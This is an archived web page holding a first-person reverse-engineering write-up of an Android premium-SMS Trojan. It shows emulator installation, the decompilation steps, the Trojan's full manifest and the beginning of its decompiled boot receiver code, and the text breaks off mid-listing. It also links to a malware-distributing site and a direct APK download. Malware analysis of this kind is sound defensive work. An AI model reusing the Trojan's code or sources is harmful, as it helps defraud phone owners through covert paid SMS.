<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>The history of reverse engineering of one SMS Trojan for Android</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="It all started with the complaints of one of my good friends, part-time owner of the device on Android. He complained that the operator constantly rem...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>The history of reverse engineering of one SMS Trojan for Android</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/getpro/habr/post_images/142/0f4/ba6/1420f4ba65801a0d5b179c3ffed58510.jpg" alt="image"><br>  It all started with the complaints of one of my good friends, part-time owner of the device on Android.  He complained that the operator constantly removes money from him for some unknown reason.  After calls to the operator, it turned out that the funds were taken for a premium SMS, which my friend allegedly sent.  I myself repeatedly ran up on the Internet for suspicious sites that offer to download apk with a game / program / Live Wallpaper, when installed, it turns out that this is just a program that sends SMS to premium numbers.  But in this case, if you press the button, then ‚Äúhe is a fool‚Äù, because the rules in such programs clearly say that sending SMS to paid numbers will follow, and they will eventually provide links to real programs. <br><br>  Anyway, the suspicion crept in to me that the situation here is also tied to this kind of activity, and I undertook to figure out where all the same money is leaking. <br><a name="habracut"></a><br><br><h4>  Secure application installation </h4><br>  Let's start with the fact that my friend forgot where he downloaded the latest programs from the network to his device, only the following <a href="http://mobisity.ru/ibii/ibii-lcya-igsci/501860-drugvokrug-11.html" rel="nofollow">mobisity.ru</a> link was shaken out of it ( <b>Caution, the site is distributing malware!</b> ).  Having rummaged on a site, I have pulled out from there <a href="http://files.mail.ru/90N6TZ">APK</a> . <br>  Now that the prehistory is known to the reader, you can move on to the most interesting part - analyzing the application.  Let's start with a safe installation of the application, namely, install it on the emulator and see how it works. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      We launch the regular Android emulator, preferably version 2.2 or higher (the application is not installed for older versions), for this we start the emulator via AVD (Android Virtual Device Manager) and execute the command <pre><code class="bash hljs">adb install mp3.apk</code> </pre> <br>  In the list of applications appears we are seeing our trojan, under the name Music and with the corresponding icon. <br><br><img src="https://habrastorage.org/storage2/41e/c6d/c58/41ec6dc58cc6a1358d492587b482c6c8.png"><br><br>  We start and observe the process of some kind of ‚Äúinstallation‚Äù, after which we are invited to click the ‚Äúnext‚Äù button <br><br><img src="https://habrastorage.org/storage2/39d/83d/067/39d83d067157fcdc868ba263b481cf8c.png"><br><br>  If you press the hardware button Menu, you can open the rules and read that after pressing the button, sending SMS to premium numbers will go.  Well, okay, so far it is from the category of "a fool himself."  So where are the funds constantly flowing away?  It is not clear yet, we investigate further. <br><br><h4>  Code analysis </h4><br>  For the analysis I used the following tools: <a href="http://java.decompiler.free.fr/%3Fq%3Djdgui">jd-gui</a> , <a href="http://code.google.com/p/dex2jar/">dex2jar</a> and <a href="http://code.google.com/p/android-apktool/">apktool</a> . <br><br>  First of all, let's analyze the APK with apktool and look at the structure of the project.  To do this, you must run the command <pre> <code class="bash hljs">apktool d mp3.apk</code> </pre>  Analysis of the internal structure of the project does not give anything interesting, except that the <b>assets</b> folder contains an incomprehensible <b>data.xml</b> file, apparently it stores some data, but is encrypted, since, at first glance, the data cannot be easily analyzed. <br><br>  Well, it remains only to watch the code, for this we use <b>dex2jar</b> .  With the help of your favorite archiver, we <b>pull</b> out the file from the APK with the name <b>classes.dex</b> , and with the help of dex2jar we convert it into a jar file.  The resulting jar needs to be opened in the <b>jd-gui</b> program.  Everything, now we have all (or almost all) application code: <br><br><img src="https://habrastorage.org/storage2/16d/331/632/16d3316325e17324273591426c2852ed.png"><br><br>  Before rushing to analyze the code, I decided to look at the <b>AndroidManifest.xml</b> file, as a rule you can get a lot of useful information about the application out of it. <br><br><div class="spoiler">  <b class="spoiler_title">Full listing file AndroidManifest.xml</b> <div class="spoiler_text"><pre> <code class="xml hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">manifest</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:versionCode</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:versionName</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"1.0"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">package</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"net.droid.installer"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:android</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.INTERNET"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.WRITE_SMS"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.READ_SMS"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.SEND_SMS"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.RECEIVE_SMS"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.WRITE_EXTERNAL_STORAGE"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.WAKE_LOCK"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.READ_PHONE_STATE"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.READ_EXTERNAL_STORAGE"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.android.launcher.permission.INSTALL_SHORTCUT"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.CALL_PHONE"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.READ_LOGS"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">uses-permission</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.RECEIVE_BOOT_COMPLETED"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">application</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:label</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"@string/app_name"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:icon</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"@drawable/icon"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">activity</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:theme</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"@android:style/Theme.NoTitleBar"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:label</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"@string/app_name"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">".InstallActivity"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:screenOrientation</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"portrait"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:configChanges</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"keyboardHidden|orientation"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.action.CREATE_SHORTCUT"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.action.MAIN"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">category</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.category.LAUNCHER"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">activity</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">activity</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:theme</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"@android:style/Theme.NoTitleBar"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">".RuleActivity"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:screenOrientation</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"portrait"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">activity</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:theme</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"@android:style/Theme.NoTitleBar"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">".LoaderActivity"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:screenOrientation</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"portrait"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">activity</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:theme</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"@android:style/Theme.NoTitleBar"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">".StartActivity"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">receiver</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">".StartupReceiver"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:enabled</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"true"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:exported</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"true"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.action.BOOT_COMPLETED"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.action.QUICKBOOT_POWERON"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">receiver</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">".UpdateService"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:enabled</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"true"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">receiver</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">".UpdateReceiver"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">receiver</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">".MessageReceiver"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:priority</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"1000"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.provider.Telephony.SMS_RECEIVED"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">receiver</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">receiver</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">".Scanner"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.action.PACKAGE_ADDED"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.action.PACKAGE_REPLACED"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.action.PACKAGE_REPLACED"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:scheme</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"package"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">receiver</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">".USSDDumbExtendedNetworkService"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"com.android.ussd.IExtendedNetworkService"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">category</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.category.DEFAULT"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">application</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">manifest</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre></div></div><br><br>  After reviewing the file, I became interested in a BroadcastReceiver called StartupReceiver - it is obvious that it runs some code when the system boots, as indicated by the stated intent-filters. <br><br><div class="spoiler">  <b class="spoiler_title">StartupReceiver Code</b> <div class="spoiler_text"><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">package</span></span> net.droid.installer; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> a; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.content.BroadcastReceiver; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.content.Context; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.content.Intent; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.content.ServiceConnection; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.content.SharedPreferences; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.content.SharedPreferences.Editor; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.os.RemoteException; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.preference.PreferenceManager; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.telephony.TelephonyManager; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-class"><span class="hljs-keyword"><span 